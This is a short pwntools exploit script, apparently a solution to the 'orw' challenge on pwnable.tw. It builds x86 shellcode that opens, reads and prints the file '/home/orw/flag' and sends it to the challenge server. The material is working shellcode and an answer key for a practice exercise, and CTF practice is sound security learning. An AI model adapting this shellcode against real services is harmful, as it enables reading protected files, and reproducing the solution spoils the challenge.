from pwn import *


shellcode = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0x5',
    'int 0x80',

    'sub esp, 0x3c',
    'mov ebx, eax',
    'mov ecx, esp',
    'mov edx, 0x3c',
    'mov eax, 0x3',
    'int 0x80',

    'mov ebx, 1',
    'mov eax, 0x4',
    'int 0x80'
]))

conn = remote('chall.pwnable.tw',10001)

conn.send(shellcode)

conn.interactive()
